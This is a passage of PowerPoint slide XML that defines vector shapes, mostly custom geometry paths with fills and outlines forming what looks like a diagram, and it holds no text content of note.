          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4989600" y="5038560"/>
            <a:ext cx="18360" cy="59760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="12" h="38">
                <a:moveTo>
                  <a:pt x="12" y="8"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="12" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="8"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="557" name="CustomShape 173"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4946760" y="5183280"/>
            <a:ext cx="59760" cy="91440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="38" h="58">
                <a:moveTo>
                  <a:pt x="38" y="27"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="38" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="27"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="800000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="558" name="CustomShape 174"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5006880" y="5465880"/>
            <a:ext cx="27720" cy="50040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="600000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="559" name="CustomShape 175"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4745160" y="4724280"/>
            <a:ext cx="440640" cy="124560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="278" h="79">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="119" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="278" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="168" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="c0c0c0"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="560" name="CustomShape 176"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5013360" y="4840200"/>
            <a:ext cx="170640" cy="92880"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="108" h="59">
                <a:moveTo>
                  <a:pt x="1" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="108" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="108" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="e0e0e0"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="561" name="CustomShape 177"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4746600" y="4724280"/>
            <a:ext cx="272160" cy="207360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="172" h="131">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="172" y="131"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="172" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a0a0a0"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="562" name="CustomShape 178"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4508640" y="4205160"/>
            <a:ext cx="639000" cy="121680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="403" h="77">
                <a:moveTo>
                  <a:pt x="202" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="181" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="123" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="52" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="52" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="123" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="181" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="242" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="261" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="297" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="344" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="357" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="363" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="368" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="374" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="379" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="387" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="396" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="403" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="396" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="387" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="379" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="374" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="368" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="363" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="357" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="344" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="297" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="261" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="242" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ccccff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="563" name="CustomShape 179"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4508640" y="4205160"/>
            <a:ext cx="639000" cy="121680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="403" h="77">
                <a:moveTo>
                  <a:pt x="202" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="181" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="123" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="52" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="52" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="123" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="142" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="181" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="242" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="261" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="297" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="72"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="70"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="68"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="344" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="357" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="363" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="368" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="374" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="379" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="387" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="396" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399" y="47"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="403" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="401" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="396" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="394" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="387" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="379" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="374" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="368" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="363" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="357" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="344" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="297" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="261" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="242" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202" y="0"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="14400">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="564" name="Line 180"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4508280" y="4194000"/>
            <a:ext cx="1800" cy="76320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="14400">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="565" name="Line 181"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5148000" y="4194000"/>
            <a:ext cx="1800" cy="76320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="14400">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="566" name="CustomShape 182"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4508640" y="4194000"/>
            <a:ext cx="634320" cy="75600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="ccccff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="567" name="CustomShape 183"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4861080" y="4222800"/>
            <a:ext cx="40680" cy="197640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" rIns="0" tIns="0" bIns="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1300" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1300" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="568" name="CustomShape 184"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4502160" y="4105440"/>
            <a:ext cx="640800" cy="143640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="404" h="91">
                <a:moveTo>
                  <a:pt x="202" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="181" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="143" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="124" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="24"/>
                </a:lnTo>
